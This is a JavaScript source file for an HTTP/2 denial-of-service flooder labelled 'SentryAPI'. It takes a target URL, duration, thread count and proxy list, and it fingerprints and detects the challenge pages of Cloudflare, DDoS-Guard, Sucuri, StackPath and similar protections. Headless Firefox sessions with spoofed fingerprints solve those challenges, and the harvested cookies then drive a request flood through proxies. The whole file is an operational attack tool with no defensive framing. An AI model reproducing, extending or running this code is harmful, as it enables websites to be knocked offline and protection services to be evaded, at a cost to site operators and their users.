

const {
    firefox
} = require('playwright-extra');
const {
    FingerprintGenerator
} = require('fingerprint-generator');
const {
    FingerprintInjector
} = require('fingerprint-injector');
const {
    UAParser
} = require('ua-parser-js');

process.on('uncaughtException', function (error) {
    //console.log(error)
});
process.on('unhandledRejection', function (error) {
    //console.log(error)
})

var request = require("request");
const fs = require('fs');
const args = require('minimist')(process.argv.slice(2));
const colors = require('colors');

const tls = require('tls');
const dns = require('dns');
const {
    SocksClient
} = require('socks');
const {
    PassThrough
} = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;
const http2 = require('http2');

const url = require('url');
const net = require('net');
const http = require('http');

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

const urlT = process.argv[2]; // Target URL
const timeT = process.argv[3]; // Attack Time
const threadsT = process.argv[4]; // Flooder Threads
const rateT = process.argv[5]; // Requests Per IP
const proxyT = process.argv[6]; // Proxy File

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
}

if (process.argv.length < 6) {
    console.log('['.gray + 'Sentry'.brightGreen + 'API'.white + ']  '.gray + 'Incorrect usage!'.brightGreen);
    console.log('['.gray + 'Sentry'.brightGreen + 'API'.white + ']  '.gray + 'Usage: '.brightGreen + `node index.js [URL] [Time] [Threads] [RATE] [Proxy File]`.white)
    console.log('['.gray + 'Sentry'.brightGreen + 'API'.white + ']  '.gray + 'Example: '.brightGreen + `node index.js https://grafana.ventox.lol 300 15 64 proxy.txt`.white)
    process.exit(0);
}

const proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

var parsed = url.parse(urlT);


/* 
    | List of Protections 
*/
const JSList = {
    "js": [{
        "name": "CloudFlare UAM",
        "navigations": 2,
        "locate": "<title>Just a moment...</title>"
    },
    {
        "name": "CloudFlare UAM",
        "navigations": 2,
        "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
    },

    {
        "name": "CloudFlare Captcha",
        "navigations": 2,
        "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
    },
    {
        "name": "China",
        "navigations": 1,
        "locate": "<h2>情纾ProxyPool</h2>"
    },
    {
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    },
    {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    },
    {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    },
    {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    },
    {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    },
    {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    },
    {
        "name": "DDoS-Guard",
        "navigations": 1,
        "locate": "DDoS protection by DDos-Guard"
    },
    {
        "name": "VShield",
        "navigations": 1,
        "locate": "<title>Captcha Challenge</title>"
    },
    {
        "name": "GameSense",
        "navigations": 1,
        "locate": "<title>GameSense</title>"
    }]
}


/* 
    | Detection of protections on the site
*/
function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}


/* 
    | Flooder
*/
async function socksFlood(cookie, ua, proxy) {
    setInterval(() => {
        const parsedProxy = proxy.split(":");

        function pidr(socket) {
            socket.setKeepAlive(true, process.argv[3] * 1000)
            socket.setTimeout(10000);


            var requestHeaders = {
                ':authority': parsed.host,
                ':method': 'GET',
                ':path': parsed.pathname,
                ':scheme': 'https',
                'User-Agent': ua,
                'Upgrade-Insecure-Requests': '1',
                'Cookie': cookie,
                'Cache-Control': 'max-age=0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
                'TE': 'trailers'
            }

            const govno = tls.connect(443, parsed.host, {
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                servername: url.hostname,
                socket: socket,
                secure: true,
                servername: parsed.host
            });

            govno.setKeepAlive(true, 60 * 10000);

            const client = http2.connect(parsed.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: true
                },
                maxSessionMemory: 64000,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => govno,
                socket: socket,
            }, () => {
                for (let i = 0; i < rateT; i++) {
                    client.request(requestHeaders).end();
                }
            });
        }

        var req = http.get({
            host: parsedProxy[0],
            port: parsedProxy[1],
            path: parsed.host + ":443",
            timeout: 15000,
            method: 'CONNECT'
        })

        req.end();
        req.on('connect', (_, socket) => {
            pidr(socket);
        });

        req.on('end', () => {
            req.resume()
            req.close();
        });
    })
}

/*
    * The function that creating new browser session.
    * Requiring "proxy" parameter as "string".
    * Nothing for return.
*/
async function doNewSession(proxy) {
    try {
        const fingerprintGenerator = new FingerprintGenerator();

        /* Generating new Browser fingerprint (Firefox) with supported headers */
        const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
            devices: ['desktop'],
            browsers: [{ name: 'firefox', minVersion: 104 }],
            operatingSystems: ['windows'],
        });

        fingerprintGenerator.getFingerprint();

        /* Need for inject headers into browser */
        const fingerprintInjector = new FingerprintInjector();
        const {
            fingerprint
        } = browserFingerprintWithHeaders;

        const navAgent = fingerprint.navigator.userAgent;
        const locales = fingerprint.navigator.language;

        const [ip, port] = proxy.split(":");

        log('['.gray + `${ip}`.green + ':'.white + `${port}`.green + '] '.gray + ' Browser created'.brightGreen + ' -> '.white + `${navAgent}`.brightGreen);

        /* 
            * Function called for create new instance of firefox browser with parametres "proxy", "userAgent that we got from 
            * fingerprint.
            * It uses virtual screen for emulating. (Needed xvfb-run <<<params>>>)
        */
        const browser = await firefox.launch({
            proxy: {
                server: 'http://' + proxy
            },
            args: [
                //'--no-sandbox',
                //'--disable-setuid-sandbox',
                //'--viewport-size 1920, 1080',
                //'--enable-automation',
                //'--disable-blink-features',
                //'--disable-blink-features=AutomationControlled',
                //'--hide-scrollbars',
                //'--mute-audio',
                //'--disable-canvas-aa',
                //'--disable-2d-canvas-clip-aa',
                //'--ignore-certificate-errors',
                //'--ignore-certificate-errors-spki-list',
                //'--disable-features=IsolateOrigins,site-per-process',
                //'--disable-gpu',
                //'--disable-sync',
                //'--disable-plugins',
                //'--disable-plugins-discovery',
                //'--disable-preconnect',
                //'--disable-notifications',
                ////'--disable-setuid-sandbox', // отключить установку UID песочницы
                ////'--disable-dev-shm-usage', // отключить использование /dev/shm
                ////'--disable-accelerated-2d-canvas', // отключить ускорение 2D-холста
                ////'--disable-infobars', // отключить infobars
                ////'--disable-web-security', // отключить защиту веб-безопасности
                //'--no-startup-window',
                //'--enable-monitor-profile',
                //'--no-remote',
                //'--wait-for-browser',
                //'--foreground',
                //'--juggler-pipe',
                //'--silent',
                //'--user-agent=' + navAgent,

                '--use-fake-ui-for-media-stream',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process',
                '--renderer-process-limit=1',
                '--mute-audio',
                '--disable-setuid-sandbox',
                '--enable-webgl',
                '--ignore-certificate-errors',
                '--use-gl=disabled',
                '--color-scheme=dark',
                '--user-agent=' + navAgent,

                //'--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                //'--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
                `--window-size=1920,1080`,
                "--window-position=000,000",
                //"--disable-dev-shm-usage",
                //'--user-agent=' + navAgent,
                '--no-sandbox',
                //'--disable-setuid-sandbox',
                //'--disable-dev-shm-usage',
                //'--disable-accelerated-2d-canvas',
                //'--no-first-run',
                //'--no-zygote',
                //'--disable-gpu',
                //'--hide-scrollbars',
                //'--mute-audio',
                //'--disable-gl-drawing-for-tests',
                //'--disable-canvas-aa',
                //'--disable-2d-canvas-clip-aa',
                //'--disable-web-security',
            ],
            ignoreDefaultArgs: [
                '--enable-automation'
            ],
            headless: true,
            javaScriptEnabled: true,
            ignoreHTTPSErrors: true,
        });

        const context = await browser.newContext({
            locale: locales,
            viewport: fingerprint.screen,
            isMobile: false,
            hasTouch: false,
            inputDevices: [
                {
                    name: 'my-mouse',
                    type: 'mouse',
                    // Emulate a slow mouse movement
                    precision: 10,
                    isTouch: false,
                },
                {
                    name: 'my-keyboard',
                    type: 'keyboard',
                    // Emulate a slow keyboard typing speed
                    layout: 'en-US',
                    repeatDelay: 100,
                    repeatInterval: 50,
                },
            ],
            //input: {
            //    emulateMouse: true,
            //    emulateTouch: true,
            //    emulateKeyboard: true,
            //},
        });

        //await context.grantPermissions(['camera']);
        //await context.grantPermissions(['microphone']);
        //await context.grantPermissions(['clipboard-write']);


        await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);

        const parser = new UAParser();
        parser.setUA(navAgent);
        const result = parser.getResult();

        await context.addInitScript(() => {
            ['height', 'width'].forEach(property => {
                const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
                Object.defineProperty(HTMLImageElement.prototype, property, {
                    ...imageDescriptor,
                    get: function () {
                        if (this.complete && this.naturalHeight == 0) {
                            return 20;
                        }
                        return imageDescriptor.get.apply(this);
                    },
                });
            });
        });

        await context.addInitScript(() => {
            Object.defineProperty(window.Notification, 'permission', {
                get: () => 'granted',
            });
        });

        await context.addInitScript(() => {
            Object.defineProperty(navigator, 'pdfViewerEnabled', {
                get: () => true,
            });
        });

        /* 
            * From this moment we will use only this.
            * That creating new page in browser.
        */
        const page = await context.newPage({
            locale: locales,
            deviceScaleFactor: 1,
            userAgent: navAgent
        });

        await page.setDefaultNavigationTimeout(0);

        await page.setViewportSize({
            width: 1920,
            height: 1080
        });


        function randomIntFromInterval(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min)
        }

        // Эмуляция еблана
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.down();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.up();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.down();
        //await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
        //await page.mouse.up();
        //await page.keyboard.press('Enter');
        //await page.keyboard.press('1');
        //await page.keyboard.press('R');


        await page.route('***', route => route.continue())
        try {
            await page.goto(urlT, {
                waitUntil: 'commit',
                timeout: 15000
            });
        } catch (e) {
            //console.log(e)
        }

        await page.waitForTimeout(9000);

        const source = (await page.content());
        const cookie = (await page.context().cookies(urlT)).map(c => `${c.name}=${c.value}`).join('; ');
        const title = (await page.title());

        const JS = await JSDetection(source);

        if (title == 'Just a moment...' || title == 'Access denied' || title == 'Problem loading page') {
            await page.close();
            await context.close();
            await browser.close();

            log('['.gray + 'Sentry'.red + 'API'.white + ']  '.gray + 'Status received'.red + ' -> '.white + `${title}`.red);
        } else {
            if (JS) {
                log('['.gray + 'Sentry'.yellow + 'API'.white + ']  '.gray + `Protection detected`.yellow + ` -> `.white + `${JS.name}`.yellow);
            } else {
                log('['.gray + 'Sentry'.green + 'API'.white + ']  '.gray + 'No JS/Captcha'.green)
            }

            log('['.gray + 'Sentry'.green + 'API'.white + ']  '.gray + 'Browser got Title'.green + ' -> '.white + `${title}`.green);
            log('['.gray + 'Sentry'.green + 'API'.white + ']  '.gray + 'Browser got Cookies'.green + ' -> '.white + `${cookie}`.green);
            log('['.gray + 'Sentry'.green + 'API'.white + ']  '.gray + 'Session Solved!'.green);

            await page.close();
            await context.close();

            await socksFlood(cookie, navAgent, proxy);
        }

    } catch (e) {
        console.log(e);
    }
}


const validProxies = [];
function check_proxy(proxy) {
    request({
        url: 'https://google.com',
        proxy: "http://" + proxy,
        headers: {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
        },
        time: true
    }, (err, res, body) => {
        if (!err) {
            validProxies.push(proxy);
            log('['.gray + 'Sentry'.brightMagenta + 'API'.white + ']  '.gray + `Added new proxy`.brightMagenta + ' -> '.white + `${proxy} `.magenta + '('.white + `${res.elapsedTime} ms`.brightMagenta + ')'.white);
        }
    });
}

async function sessionIn() {
    for (let i = 0; i < threadsT; i++) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];

        doNewSession(proxy);
    }
}

function main() {
    log('['.gray + 'Sentry'.brightBlue + 'API'.white + ']  '.gray + `Target`.brightBlue + ' -> '.white + `${urlT}`.brightBlue);
    log('['.gray + 'Sentry'.brightBlue + 'API'.white + ']  '.gray + `Time`.brightBlue + ' -> '.white + `${timeT}`.brightBlue);
    log('['.gray + 'Sentry'.brightBlue + 'API'.white + ']  '.gray + `Threads (Sessions)`.brightBlue + ' -> '.white + `${threadsT}`.brightBlue);
    log('['.gray + 'Sentry'.brightBlue + 'API'.white + ']  '.gray + `Proxy File`.brightBlue + ' -> '.white + `${proxyT}`.brightBlue);
    log('['.gray + 'Sentry'.cyan + 'API'.white + ']  '.gray + `Starting browser...`.cyan);

    sessionIn();
}

main();


setTimeout(() => {
    process.exit(0);
}, timeT * 1000)